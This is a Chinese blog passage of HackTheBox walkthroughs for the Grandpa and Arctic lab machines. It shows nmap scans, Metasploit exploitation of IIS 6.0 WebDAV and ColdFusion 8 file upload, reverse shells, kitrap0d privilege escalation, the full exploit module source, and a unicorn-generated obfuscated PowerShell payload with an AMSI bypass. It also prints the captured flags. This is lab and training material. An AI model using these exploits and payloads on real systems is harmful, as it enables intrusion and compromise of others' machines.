信息搜集Nmap┌──(root💀kali)-[~/Desktop/HTB/Easy/Grandpa] └─# nmap -sS -A -sC -sV -p- --min-rate 5000 10.10.10.14 Starting Nmap 7.91 ( https://nmap.org ) at 2022-03-25 02:52 EDT Nmap scan report for 10.10.10.14 Host is up (0.53s latency). Not shown: 65534 filtered ports PORT STATE SERVICE VERSION 80/tcp open http Microsoft IIS httpd 6.0 | http-methods: |_ Potentially risky methods: TRACE COPY PROPFIND SEARCH LOCK UNLOCK DELETE PUT MOVE MKCOL PROPPATCH |_http-server-header: Microsoft-IIS/6.0 |_http-title: Under Construction | http-webdav-scan: | Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH | Server Type: Microsoft-IIS/6.0 | Server Date: Fri, 25 Mar 2022 06:53:29 GMT | WebDAV type: Unknown |_ Allowed Methods: OPTIONS, TRACE, GET, HEAD, COPY, PROPFIND, SEARCH, LOCK, UNLOCK Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port Device type: general purpose Running (JUST GUESSING): Microsoft Windows 2003|2008|XP|2000 (92%) OS CPE: cpe:/o:microsoft:windows_server_2003::sp1 cpe:/o:microsoft:windows_server_2003::sp2 cpe:/o:microsoft:windows_server_2008::sp2 cpe:/o:microsoft:windows_xp::sp3 cpe:/o:microsoft:windows_2000::sp4 Aggressive OS guesses: Microsoft Windows Server 2003 SP1 or SP2 (92%), Microsoft Windows Server 2008 Enterprise SP2 (92%), Microsoft Windows Server 2003 SP2 (91%), Microsoft Windows 2003 SP2 (91%), Microsoft Windows XP SP3 (90%), Microsoft Windows 2000 SP4 or Windows XP Professional SP1 (90%), Microsoft Windows XP (87%), Microsoft Windows 2000 SP4 (87%), Microsoft Windows Server 2003 SP1 - SP2 (86%), Microsoft Windows XP SP2 or Windows Server 2003 (86%) No exact OS matches for host (test conditions non-ideal). Network Distance: 2 hops Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows TRACEROUTE (using port 80/tcp) HOP RTT ADDRESS 1 524.27 ms 10.10.16.1 2 524.42 ms 10.10.10.14 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 71.52 seconds Http 这里提示没有默认页面，去看看是不是 IIS 本身的漏洞吧 Searchsploit┌──(root💀kali)-[~/Desktop] └─# searchsploit IIS 6.0 ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- --------------------------------- Exploit Title | Path ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- --------------------------------- Microsoft IIS 4.0/5.0/6.0 - Internal IP Address/Internal Network Name Disclosure | windows/remote/21057.txt Microsoft IIS 5.0/6.0 FTP Server (Windows 2000) - Remote Stack Overflow | windows/remote/9541.pl Microsoft IIS 5.0/6.0 FTP Server - Stack Exhaustion Denial of Service | windows/dos/9587.txt Microsoft IIS 6.0 - &#39;/AUX / &#39;.aspx&#39; Remote Denial of Service | windows/dos/3965.pl Microsoft IIS 6.0 - ASP Stack Overflow Stack Exhaustion (Denial of Service) (MS10-065) | windows/dos/15167.txt Microsoft IIS 6.0 - WebDAV &#39;ScStoragePathFromUrl&#39; Remote Buffer Overflow | windows/remote/41738.py Microsoft IIS 6.0 - WebDAV Remote Authentication Bypass | windows/remote/8765.php Microsoft IIS 6.0 - WebDAV Remote Authentication Bypass (1) | windows/remote/8704.txt Microsoft IIS 6.0 - WebDAV Remote Authentication Bypass (2) | windows/remote/8806.pl Microsoft IIS 6.0 - WebDAV Remote Authentication Bypass (Patch) | windows/remote/8754.patch Microsoft IIS 6.0/7.5 (+ PHP) - Multiple Vulnerabilities | windows/remote/19033.txt ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- --------------------------------- Shellcodes: No Results 我们看看 Microsoft IIS 6.0 - WebDAV ‘ScStoragePathFromUrl’ Remote Buffer Overflow 远程缓冲区溢出，感觉有戏 漏洞利用先去看看 msf 有没有相关的漏洞利用模块 msf6 &gt; search IIS 6.0 Matching Modules ================ # Name Disclosure Date Rank Check Description - ---- --------------- ---- ----- ----------- 0 exploit/windows/firewall/blackice_pam_icq 2004-03-18 great No ISS PAM.dll ICQ Parser Buffer Overflow 1 auxiliary/dos/windows/http/ms10_065_ii6_asp_dos 2010-09-14 normal No Microsoft IIS 6.0 ASP Stack Exhaustion Denial of Service 2 exploit/windows/iis/iis_webdav_scstoragepathfromurl 2017-03-26 manual Yes Microsoft IIS WebDav ScStoragePathFromUrl Overflow Interact with a module by name or index. For example info 2, use 2 or use exploit/windows/iis/iis_webdav_scstoragepathfromurl 这边确实有一个，去加载一下试试 msf6 exploit(windows/iis/iis_webdav_scstoragepathfromurl) &gt; show options Module options (exploit/windows/iis/iis_webdav_scstoragepathfromurl): Name Current Setting Required Description ---- --------------- -------- ----------- MAXPATHLENGTH 60 yes End of physical path brute force MINPATHLENGTH 3 yes Start of physical path brute force Proxies no A proxy chain of format type:host:port[,type:host:port][...] RHOSTS 10.10.10.14 yes The target host(s), range CIDR identifier, or hosts file with syntax &#39;file:&lt;path&gt;&#39; RPORT 80 yes The target port (TCP) SSL false no Negotiate SSL/TLS for outgoing connections TARGETURI / yes Path of IIS 6 web application VHOST no HTTP server virtual host Payload options (windows/meterpreter/reverse_tcp): Name Current Setting Required Description ---- --------------- -------- ----------- EXITFUNC process yes Exit technique (Accepted: &#39;&#39;, seh, thread, process, none) LHOST 10.10.16.4 yes The listen address (an interface may be specified) LPORT 4444 yes The listen port Exploit target: Id Name -- ---- 0 Microsoft Windows Server 2003 R2 SP2 x86 设置好相关的配置，然后执行 msf6 exploit(windows/iis/iis_webdav_scstoragepathfromurl) &gt; exploit [*] Started reverse TCP handler on 10.10.16.4:4444 [*] Trying path length 3 to 60 ... [*] Sending stage (175174 bytes) to 10.10.10.14 [*] Meterpreter session 2 opened (10.10.16.4:4444 -&gt; 10.10.10.14:1031) at 2022-03-25 03:31:02 -0400 meterpreter &gt; shell [-] Failed to spawn shell with thread impersonation. Retrying without it. Process 2056 created. Channel 2 created. Microsoft Windows [Version 5.2.3790] (C) Copyright 1985-2003 Microsoft Corp. c:\\windows\\system32\\inetsrv&gt;whoami whoami nt authority\\network service 成功拿到一个 shell 不过权限很低 使用 background 返回 权限提升使用 post&#x2F;multi&#x2F;recon&#x2F;local_exploit_suggester 进行提权脚本查询 msf6 exploit(windows/iis/iis_webdav_scstoragepathfromurl) &gt; use post/multi/recon/local_exploit_suggester msf6 post(multi/recon/local_exploit_suggester) &gt; show options Module options (post/multi/recon/local_exploit_suggester): Name Current Setting Required Description ---- --------------- -------- ----------- SESSION yes The session to run this module on SHOWDESCRIPTION false yes Displays a detailed description for the available exploits msf6 post(multi/recon/local_exploit_suggester) &gt; set session 2 session =&gt; 2 设置好以后，exploit 执行 msf6 post(multi/recon/local_exploit_suggester) &gt; exploit [*] 10.10.10.14 - Collecting local exploits for x86/windows... [*] 10.10.10.14 - 38 exploit checks are being tried... [+] 10.10.10.14 - exploit/windows/local/ms10_015_kitrap0d: The service is running, but could not be validated. [+] 10.10.10.14 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable. [+] 10.10.10.14 - exploit/windows/local/ms14_070_tcpip_ioctl: The target appears to be vulnerable. [+] 10.10.10.14 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable. [+] 10.10.10.14 - exploit/windows/local/ms16_016_webdav: The service is running, but could not be validated. [+] 10.10.10.14 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable. [*] Post module execution completed 以上都是当前机器下可能可用的提权模块 exploit/windows/local/ms10_015_kitrap0d 挨个尝试后，都是提示没有权限 “Exploit failed: Rex::Post::Meterpreter::RequestError stdapi_sys_config_getsid: Operation failed: Access is denied.” meterpreter &gt; getuid [-] stdapi_sys_config_getuid: Operation failed: Access is denied. 直接使用 getuid 命令也是不行的 meterpreter &gt; ps Process List ============ PID PPID Name Arch Session User Path --- ---- ---- ---- ------- ---- ---- 0 0 [System Process] 4 0 System 272 4 smss.exe 320 272 csrss.exe 344 272 winlogon.exe 392 344 services.exe 404 344 lsass.exe 532 584 davcdata.exe x86 0 NT AUTHORITY\\NETWORK SERVICE C:\\WINDOWS\\system32\\inetsrv\\davcdata.exe 584 392 svchost.exe 668 392 svchost.exe 732 392 svchost.exe 772 392 svchost.exe 788 392 svchost.exe 924 392 spoolsv.exe 952 392 msdtc.exe 1072 392 cisvc.exe 1112 392 svchost.exe 1168 392 inetinfo.exe 1204 392 svchost.exe 1308 392 VGAuthService.exe 1380 392 vmtoolsd.exe 1484 392 svchost.exe 1588 392 svchost.exe 1768 392 dllhost.exe 1908 392 alg.exe 1936 584 wmiprvse.exe x86 0 NT AUTHORITY\\NETWORK SERVICE C:\\WINDOWS\\system32\\wbem\\wmiprvse.exe 2404 584 wmiprvse.exe 2604 344 logon.scr 2656 1484 w3wp.exe x86 0 NT AUTHORITY\\NETWORK SERVICE c:\\windows\\system32\\inetsrv\\w3wp.exe 3408 2656 rundll32.exe x86 0 C:\\WINDOWS\\system32\\rundll32.exe 3892 1072 cidaemon.exe 3936 1072 cidaemon.exe 3972 1072 cidaemon.exe meterpreter &gt; migrate 1936 [*] Migrating from 3408 to 1936... [*] Migration completed successfully. 尝试一下进程迁移 meterpreter &gt; getuid Server username: NT AUTHORITY\\NETWORK SERVICE 进程迁移后可以执行 getuid 命令 再尝试一下提权模块 exploit&#x2F;windows&#x2F;local&#x2F;ms10_015_kitrap0d msf6 exploit(windows/local/ms10_015_kitrap0d) &gt; show options Module options (exploit/windows/local/ms10_015_kitrap0d): Name Current Setting Required Description ---- --------------- -------- ----------- SESSION 1 yes The session to run this module on. Payload options (windows/meterpreter/reverse_tcp): Name Current Setting Required Description ---- --------------- -------- ----------- EXITFUNC process yes Exit technique (Accepted: &#39;&#39;, seh, thread, process, none) LHOST 10.10.16.4 yes The listen address (an interface may be specified) LPORT 5555 yes The listen port Exploit target: Id Name -- ---- 0 Windows 2K SP4 - Windows 7 (x86) 然后执行 msf6 exploit(windows/local/ms10_015_kitrap0d) &gt; exploit [*] Started reverse TCP handler on 10.10.16.4:5555 [*] Launching notepad to host the exploit... [+] Process 408 launched. [*] Reflectively injecting the exploit DLL into 408... [*] Injecting exploit into 408 ... [*] Exploit injected. Injecting payload into 408... [*] Payload injected. Executing exploit... [+] Exploit finished, wait for (hopefully privileged) payload execution to complete. [*] Sending stage (175174 bytes) to 10.10.10.14 [*] Meterpreter session 2 opened (10.10.16.4:5555 -&gt; 10.10.10.14:1031) at 2022-03-27 21:33:07 -0400 meterpreter &gt; getuid Server username: NT AUTHORITY\\SYSTEM 成功提权到 system 权限 meterpreter &gt; search -f user.txt Found 1 result... c:\\Documents and Settings\\Harry\\Desktop\\user.txt (32 bytes) meterpreter &gt; search -f root.txt Found 1 result... c:\\Documents and Settings\\Administrator\\Desktop\\root.txt (32 bytes) meterpreter &gt; cat &#39;c:\\Documents and Settings\\Harry\\Desktop\\user.txt&#39; bdff5ec67c3cff017f2bedc146a5d869 meterpreter &gt; cat &#39;c:\\Documents and Settings\\Administrator\\Desktop\\root.txt&#39; 9359e905a2c35f861f6a57cecf28bb7b meterpreter &gt; 成功拿到 user 和 root 权限的 flag 文件","categories":[],"tags":[{"name":"Hackthebox","slug":"Hackthebox","permalink":"http://www.lucifiel.com/tags/Hackthebox/"}]},{"title":"Arctic - Hackthebox","slug":"Hackthebox/Easy/Hackthebox-Arctic","date":"2022-03-25T11:38:36.000Z","updated":"2023-06-13T03:39:40.000Z","comments":true,"path":"2022/03/25/Hackthebox/Easy/Hackthebox-Arctic/","link":"","permalink":"http://www.lucifiel.com/2022/03/25/Hackthebox/Easy/Hackthebox-Arctic/","excerpt":"","text":"Hackthebox - Arctic靶场信息 靶场类型 信息搜集Nmap┌──(root💀kali)-[~/Desktop/HTB/Easy/Arctic] └─# nmap -sC -sV -oA nmap 10.10.10.11 Starting Nmap 7.91 ( https://nmap.org ) at 2022-03-24 02:23 EDT Nmap scan report for 10.10.10.11 Host is up (0.35s latency). Not shown: 997 filtered ports PORT STATE SERVICE VERSION 135/tcp open msrpc Microsoft Windows RPC 8500/tcp open fmtp? 49154/tcp open msrpc Microsoft Windows RPC Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 252.28 seconds HTTP这里的 8500 是一个 HTTP 服务，打开后需要等待约 10-20 秒的时间来加载。这台靶机的翻译叫做北极，我想原因就是因为太慢了吧。 在 CFIDE 目录下有一个 administrator 目录，我们进去看看 然后就会进入一个登录页面，赫然写着 ColdFusion 8，去 search 一下看看有没有相关的漏洞 漏洞利用SearchSploit┌──(root💀kali)-[~/Desktop/HTB/Easy/Arctic] └─# searchsploit ColdFusion 8 ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- --------------------------------- Exploit Title | Path ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- --------------------------------- Adobe ColdFusion - &#39;probe.cfm&#39; Cross-Site Scripting | cfm/webapps/36067.txt Adobe ColdFusion - Directory Traversal | multiple/remote/14641.py Adobe ColdFusion - Directory Traversal (Metasploit) | multiple/remote/16985.rb Adobe Coldfusion 11.0.03.292866 - BlazeDS Java Object Deserialization Remote Code Execution | windows/remote/43993.py Adobe ColdFusion 2018 - Arbitrary File Upload | multiple/webapps/45979.txt Adobe ColdFusion 9 - Administrative Authentication Bypass | windows/webapps/27755.txt Adobe ColdFusion &lt; 11 Update 10 - XML External Entity Injection | multiple/webapps/40346.py Adobe ColdFusion Server 8.0.1 - &#39;/administrator/enter.cfm&#39; Query String Cross-Site Scripting | cfm/webapps/33170.txt Adobe ColdFusion Server 8.0.1 - &#39;/wizards/common/_authenticatewizarduser.cfm&#39; Query String Cross-Site Scripting | cfm/webapps/33167.txt Adobe ColdFusion Server 8.0.1 - &#39;/wizards/common/_logintowizard.cfm&#39; Query String Cross-Site Scripting | cfm/webapps/33169.txt Adobe ColdFusion Server 8.0.1 - &#39;administrator/logviewer/searchlog.cfm?startRow&#39; Cross-Site Scripting | cfm/webapps/33168.txt Allaire ColdFusion Server 4.0 - Remote File Display / Deletion / Upload / Execution | multiple/remote/19093.txt Allaire ColdFusion Server 4.0.1 - &#39;CFCRYPT.EXE&#39; Decrypt Pages | windows/local/19220.c ColdFusion 8.0.1 - Arbitrary File Upload / Execution (Metasploit) | cfm/webapps/16788.rb ColdFusion 9-10 - Credential Disclosure | multiple/webapps/25305.py ColdFusion MX - Missing Template Cross-Site Scripting | cfm/remote/21548.txt ColdFusion Scripts Red_Reservations - Database Disclosure | asp/webapps/7440.txt Macromedia ColdFusion MX 6.0 - Remote Development Service File Disclosure | multiple/remote/22867.pl ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- --------------------------------- Shellcodes: No Results ColdFusion 8.0.1 - Arbitrary File Upload &#x2F; Execution (Metasploit) 这条显示有一个文件上传，并且有 MSF 脚本，去运行试试 Msfconsolemsf6 &gt; search ColdFusion Matching Modules ================ # Name Disclosure Date Rank Check Description - ---- --------------- ---- ----- ----------- 0 exploit/multi/http/coldfusion_ckeditor_file_upload 2018-09-11 excellent No Adobe ColdFusion CKEditor unrestricted file upload 1 exploit/multi/http/coldfusion_rds_auth_bypass 2013-08-08 great Yes Adobe ColdFusion RDS Authentication Bypass 2 auxiliary/scanner/http/adobe_xml_inject normal No Adobe XML External Entity Injection 3 auxiliary/gather/coldfusion_pwd_props 2013-05-07 normal Yes ColdFusion &#39;password.properties&#39; Hash Extraction 4 exploit/windows/http/coldfusion_fckeditor 2009-07-03 excellent No ColdFusion 8.0.1 Arbitrary File Upload and Execute 5 auxiliary/scanner/http/coldfusion_locale_traversal normal No ColdFusion Server Check 6 auxiliary/scanner/http/coldfusion_version normal No ColdFusion Version Scanner 7 exploit/linux/misc/hid_discoveryd_command_blink_on_unauth_rce 2016-03-28 excellent Yes HID discoveryd command_blink_on Unauthenticated RCE Interact with a module by name or index. For example info 7, use 7 or use exploit/linux/misc/hid_discoveryd_command_blink_on_unauth_rce 直接使用第一个 然后尝试是否可以成功 msf6 &gt; use 4 [*] No payload configured, defaulting to generic/shell_reverse_tcp msf6 exploit(windows/http/coldfusion_fckeditor) &gt; set payload generic/shell_reverse_tcp payload =&gt; generic/shell_reverse_tcp 使用相关的模块，并且设置好攻击模块 msf6 exploit(windows/http/coldfusion_fckeditor) &gt; show options Module options (exploit/windows/http/coldfusion_fckeditor): Name Current Setting Required Description ---- --------------- -------- ----------- FCKEDITOR_DIR /CFIDE/scripts/ajax/FCKeditor/editor/filemanager/connectors/cfm/upload.cfm no The path to upload.cfm Proxies no A proxy chain of format type:host:port[,type:host:port][...] RHOSTS yes The target host(s), range CIDR identifier, or hosts file with syntax &#39;file:&lt;path&gt;&#39; RPORT 80 yes The target port (TCP) SSL false no Negotiate SSL/TLS for outgoing connections VHOST no HTTP server virtual host Payload options (generic/shell_reverse_tcp): Name Current Setting Required Description ---- --------------- -------- ----------- LHOST 192.168.200.128 yes The listen address (an interface may be specified) LPORT 4444 yes The listen port Exploit target: Id Name -- ---- 0 Universal Windows Target 这是需要设置的参数 msf6 exploit(windows/http/coldfusion_fckeditor) &gt; set rhosts 10.10.10.11 rhosts =&gt; 10.10.10.11 msf6 exploit(windows/http/coldfusion_fckeditor) &gt; set rport 8500 rport =&gt; 8500 msf6 exploit(windows/http/coldfusion_fckeditor) &gt; set lhost 10.10.16.4 lhost =&gt; 10.10.16.4 msf6 exploit(windows/http/coldfusion_fckeditor) &gt; show options Module options (exploit/windows/http/coldfusion_fckeditor): Name Current Setting Required Description ---- --------------- -------- ----------- FCKEDITOR_DIR /CFIDE/scripts/ajax/FCKeditor/editor/filemanager/connectors/cfm/upload.cfm no The path to upload.cfm Proxies no A proxy chain of format type:host:port[,type:host:port][...] RHOSTS 10.10.10.11 yes The target host(s), range CIDR identifier, or hosts file with syntax &#39;file:&lt;path&gt;&#39; RPORT 8500 yes The target port (TCP) SSL false no Negotiate SSL/TLS for outgoing connections VHOST no HTTP server virtual host Payload options (generic/shell_reverse_tcp): Name Current Setting Required Description ---- --------------- -------- ----------- LHOST 10.10.16.4 yes The listen address (an interface may be specified) LPORT 4444 yes The listen port Exploit target: Id Name -- ---- 0 Universal Windows Target 设置好相关的参数后，exploit 执行 msf6 exploit(windows/http/coldfusion_fckeditor) &gt; exploit [*] Started reverse TCP handler on 10.10.16.4:4444 [*] Sending our POST request... [-] Upload Failed... [*] Exploit completed, but no session was created. 这个 exploit 在执行后几乎就秒失败了，这是有问题的，因为这个网站不管执行什么，都应该有个大约 30 秒左右的缓冲，我们检查一下原因 msf6 exploit(windows/http/coldfusion_fckeditor) &gt; show advanced Module advanced options (exploit/windows/http/coldfusion_fckeditor): Name Current Setting Required Description ---- --------------- -------- ----------- ContextInformationFile no The information file that contains context information DOMAIN WORKSTATION yes The domain to use for Windows authentication DigestAuthIIS true no Conform to IIS, should work for most servers. Only set to false for non-IIS servers DisablePayloadHandler false no Disable the handler code for the selected payload EnableContextEncoding false no Use transient context when encoding payloads FingerprintCheck true no Conduct a pre-exploit fingerprint verification HttpClientTimeout no HTTP connection and receive timeout HttpPassword no The HTTP password to specify for authentication HttpRawHeaders no Path to ERB-templatized raw headers to append to existing headers HttpTrace false no Show the raw HTTP requests and responses HttpTraceColors red/blu no HTTP request and response colors for HttpTrace (unset to disable) HttpTraceHeadersOnly false no Show HTTP headers only in HttpTrace HttpUsername no The HTTP username to specify for authentication SSLVersion Auto yes Specify the version of SSL/TLS to be used (Auto, TLS and SSL23 are auto-negotiate) (Accepted: Auto, TLS, SSL23, SSL3, TLS 1, TLS1.1, TLS1.2) UserAgent Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1) no The User-Agent header to use for all requests VERBOSE false no Enable detailed status messages WORKSPACE no Specify the workspace for this module WfsDelay 2 no Additional delay in seconds to wait for a session Payload advanced options (generic/shell_reverse_tcp): Name Current Setting Required Description ---- --------------- -------- ----------- ARCH no The architecture that is being targeted PLATFORM no The platform that is being targeted ReverseAllowProxy false yes Allow reverse tcp even with Proxies specified. Connect back will NOT go through proxy but directly to LHOST ReverseListenerBindAddress no The specific IP address to bind to on the local system ReverseListenerBindPort no The port to bind to on the local system if different from LPORT ReverseListenerComm no The specific communication channel to use for this listener ReverseListenerThreaded false yes Handle every connection in a new thread (experimental) StagerRetryCount 10 no The number of times the stager should retry if the first connect fails StagerRetryWait 5 no Number of seconds to wait for the stager between reconnect attempts VERBOSE false no Enable detailed status messages WORKSPACE no Specify the workspace for this module msf6 exploit(windows/http/coldfusion_fckeditor) &gt; set VERBOSE TRUE VERBOSE =&gt; true 我们将 VERBOSE 设置为 TRUE 然后再执行 msf6 exploit(windows/http/coldfusion_fckeditor) &gt; exploit [*] Started reverse TCP handler on 10.10.16.4:4444 [*] Sending our POST request... [-] Upload Failed... [*] Exploit completed, but no session was created. 然后执行后还是没有得到相关的信息，以及详细情况，我们抓个包看看内容 添加一个新的代理，设置端口为 8500，并将流量转发到 10.10.10.11的 8500 端口 我们切换好代理，然后去执行 成功抓到了 payload 内容 我们发送到 repeater，然后执行 在下面可以看到，有一段命令是向我们的 ip 和端口回弹一个shell，但是被上面的 00 截断还是什么玩意儿的给截断了还是吧啦吧啦的，反正就是没执行成功，但是文件应该上去了。在本地使用 nc 监听一个端口，然后手动访问一下我们上传的文件 ┌──(root💀kali)-[~/Desktop] └─# nc -nvlp 4444 listening on [any] 4444 ... http://10.10.10.11:8500/userfiles/file/MMJPPXXEPA.jsp 然后等待 30 秒 ┌──(root💀kali)-[~/Desktop] └─# nc -nvlp 4444 listening on [any] 4444 ... connect to [10.10.16.4] from (UNKNOWN) [10.10.10.11] 49440 Microsoft Windows [Version 6.1.7600] Copyright (c) 2009 Microsoft Corporation. All rights reserved. C:\\ColdFusion8\\runtime\\bin&gt;whoami whoami arctic\\tolis 成功拿到一个 shell C:\\Users\\tolis\\Desktop&gt;cd C:\\Users\\tolis\\Desktop cd C:\\Users\\tolis\\Desktop C:\\Users\\tolis\\Desktop&gt;type user.txt type user.txt b30ff1922f046d55ccb4b125ea8f1539 成功拿到一个 user 权限的 flag 文件 Msf 修复查找一下 windows&#x2F;http&#x2F;coldfusion_fckeditor 的地址 ┌──(root💀kali)-[~/Desktop] └─# locate windows/http/coldfusion_fckeditor 1 ⨯ /usr/share/metasploit-framework/modules/exploits/windows/http/coldfusion_fckeditor.rb 查看一下 ┌──(root💀kali)-[~/Desktop] └─# cat /usr/share/metasploit-framework/modules/exploits/windows/http/coldfusion_fckeditor.rb ## # This module requires Metasploit: https://metasploit.com/download # Current source: https://github.com/rapid7/metasploit-framework ## class MetasploitModule &lt; Msf::Exploit::Remote Rank = ExcellentRanking include Msf::Exploit::Remote::HttpClient def initialize(info = {}) super(update_info(info, &#39;Name&#39; =&gt; &#39;ColdFusion 8.0.1 Arbitrary File Upload and Execute&#39;, &#39;Description&#39; =&gt; %q{ This module exploits the Adobe ColdFusion 8.0.1 FCKeditor &#39;CurrentFolder&#39; File Upload and Execute vulnerability. }, &#39;Author&#39; =&gt; [ &#39;MC&#39; ], &#39;License&#39; =&gt; MSF_LICENSE, &#39;Platform&#39; =&gt; &#39;win&#39;, &#39;Privileged&#39; =&gt; true, &#39;References&#39; =&gt; [ [ &#39;CVE&#39;, &#39;2009-2265&#39; ], [ &#39;OSVDB&#39;, &#39;55684&#39;], ], &#39;Targets&#39; =&gt; [ [ &#39;Universal Windows Target&#39;, { &#39;Arch&#39; =&gt; ARCH_JAVA, &#39;Payload&#39; =&gt; { &#39;DisableNops&#39; =&gt; true, }, } ], ], &#39;DefaultOptions&#39; =&gt; { &#39;SHELL&#39; =&gt; &#39;cmd.exe&#39; }, &#39;DefaultTarget&#39; =&gt; 0, &#39;DisclosureDate&#39; =&gt; &#39;2009-07-03&#39; )) register_options( [ OptString.new(&#39;FCKEDITOR_DIR&#39;, [ false, &#39;The path to upload.cfm &#39;, &#39;/CFIDE/scripts/ajax/FCKeditor/editor/filemanager/connectors/cfm/upload.cfm&#39; ]), ]) end def exploit page = rand_text_alpha_upper(rand(10) + 1) + &quot;.jsp&quot; dbl = Rex::MIME::Message.new dbl.add_part(payload.encoded, &quot;application/x-java-archive&quot;, nil, &quot;form-data; name=\\&quot;newfile\\&quot;; filename=\\&quot;#{rand_text_alpha_upper(8)}.txt\\&quot;&quot;) file = dbl.to_s file.strip! print_status(&quot;Sending our POST request...&quot;) res = send_request_cgi( { &#39;uri&#39; =&gt; normalize_uri(datastore[&#39;FCKEDITOR_DIR&#39;]), &#39;query&#39; =&gt; &quot;Command=FileUpload&amp;Type=File&amp;CurrentFolder=/#{page}%00&quot;, &#39;version&#39; =&gt; &#39;1.1&#39;, &#39;method&#39; =&gt; &#39;POST&#39;, &#39;ctype&#39; =&gt; &#39;multipart/form-data; boundary=&#39; + dbl.bound, &#39;data&#39; =&gt; file, }, 5) if ( res and res.code == 200 and res.body =~ /OnUploadCompleted/ ) print_status(&quot;Upload succeeded! Executing payload...&quot;) send_request_raw( { # default path in Adobe ColdFusion 8.0.1. &#39;uri&#39; =&gt; &#39;/userfiles/file/&#39; + page, &#39;method&#39; =&gt; &#39;GET&#39;, }, 5) handler else print_error(&quot;Upload Failed...&quot;) return end end end 这里将 74 行和 84 行的等待 5 秒更换为等待 25 秒即可成功使用 权限提升失败的方法 https://github.com/trustedsec/unicorn 这里使用 unicorn 工具反向一个 Meterpreter 的 shell 回来 使用 unicorn 生成一下 ┌──(root💀kali)-[~/…/HTB/Easy/Arctic/unicorn] └─# ./unicorn.py windows/meterpreter/reverse_tcp 10.10.16.4 5555 然后会生成两个文件 ┌──(root💀kali)-[~/…/HTB/Easy/Arctic/unicorn] └─# cat unicorn.rc use multi/handler set payload windows/meterpreter/reverse_tcp set LHOST 10.10.16.4 set LPORT 5555 set ExitOnSession false set AutoVerifySession false set AutoSystemInfo false set AutoLoadStdapi false exploit -j 一个是加载监听器的所有命令 ┌──(root💀kali)-[~/…/HTB/Easy/Arctic/unicorn] └─# cat powershell_attack.txt # AMSI bypass code - run in same process as unicorn second stage powershell /w 1 /C &quot;sv PWA -;sv es ec;sv xo ((gv PWA).value.toString()+(gv es).value.toString());powershell (gv xo).value.toString() (&#39;JABWAGUAbABqAG4AIAA9ACAAQAAiAAoAdQBzAGkAbgBnACAAUwB5AHMAdABlAG0AOwB1AHMAaQBuAGcAIABTAHkAcwB0AGUAbQAuAFIAdQBuAHQAaQBtAGUALgBJAG4AdABlAHIAbwBwAFMAZQByAHYAaQBjAGUAcwA7AHAAdQBiAGwAaQBjACAAYwBsAGEAcwBzACAAVwBpAG4AMwAyACAAewBbAEQAbABsAEkAbQBwAG8AcgB0ACgAIgBrAGUAIgArACIAcgAiACsAIgBuAGUAbAAzADIAIgApAF0AcAB1AGIAbABpAGMAIABzAHQAYQB0AGkAYwAgAGUAeAB0AGUAcgBuACAASQBuAHQAUAB0AHIAIABHAGUAdABQAHIAbwBjAEEAZABkAHIAZQBzAHMAKABJAG4AdABQAHQAcgAgAGgATQBvAGQAdQBsAGUALAAgAHMAdAByAGkAbgBnACAAcAByAG8AYwBOAGEAbQBlACkAOwBbAEQAbABsAEkAbQBwAG8AcgB0ACgAIgBrAGUAIgArACIAcgAiACsAIgBuAGUAbAAzADIAIgApAF0AIABwAHUAYgBsAGkAYwAgAHMAdABhAHQAaQBjACAAZQB4AHQAZQByAG4AIABJAG4AdABQAHQAcgAgAEwAbwBhAGQATABpAGIAcgBhAHIAeQAoAHMAdAByAGkAbgBnACAAbgBhAG0AZQApADsAWwBEAGwAbABJAG0AcABvAHIAdAAoACIAawBlACIAKwAiAHIAIgArACIAbgBlAGwAMwAyACIAKQBdACAAcAB1AGIAbABpAGMAIABzAHQAYQB0AGkAYwAgAGUAeAB0AGUAcgBuACAAYgBvAG8AbAAgAFYAaQByAHQAdQBhAGwAUAByAG8AdABlAGMAdAAoAEkAbgB0AFAAdAByACAAbABwAEEAZABkAHIAZQBzAHMALAAgAFUASQBuAHQAUAB0AHIAIABkAHcAUwBpAHoAZQAsACAAdQBpAG4AdAAgAGYAbABOAGUAdwBQAHIAbwB0AGUAYwB0ACwAIABvAHUAdAAgAHUAaQBuAHQAIABsAHAAZgBsAE8AbABkAFAAcgBvAHQAZQBjAHQAKQA7AH0ACgAiAEAACgBBAGQAZAAtAFQAeQBwAGUAIAAkAFYAZQBsAGoAbgA7ACQAbQBFAE4AYQBiAGkAIAA9ACAAWwBXAGkAbgAzADIAXQA6ADoARwBlAHQAUAByAG8AYwBBAGQAZAByAGUAcwBzACgAWwBXAGkAbgAzADIAXQA6ADoATABvAGEAZABMAGkAYgByAGEAcgB5ACgAIgBBACIAKwAiAG0AIgArACIAcwBpAC4AZAAiACsAIgBsACIAKwAiAGwAIgApACwAIAAiAEEAIgArACIAbQAiACsAIgBzAGkAUwBjAGEAbgBCAHUAZgBmACIAKwAiAGUAIgArACIAcgAiACkAOwAkAE8AbQBSAGMAaQBpAHUAUwBlAFUAIAA9ACAAMAA7AFsAVwBpAG4AMwAyAF0AOgA6AFYAaQByAHQAdQBhAGwAUAByAG8AdABlAGMAdAAoACQAbQBFAE4AYQBiAGkALAAgAFsAdQBpAG4AdAAzADIAXQBbAHUAaQBuAHQAMwAyAF0ANQAsACAAMAB4ADQAMAAsACAAWwByAGUAZgBdACQATwBtAFIAYwBpAGkAdQBTAGUAVQApADsAJABIAFUAQQBRAFQAVABrACAAPQAgACgAIgB9AHgAZgBaAGYAeABsAHUAUgAsACAAfQB4AGkAagBYAGgASwB0AE8ALAAgAH0AeAB9AH0ALAAgAH0AeAB9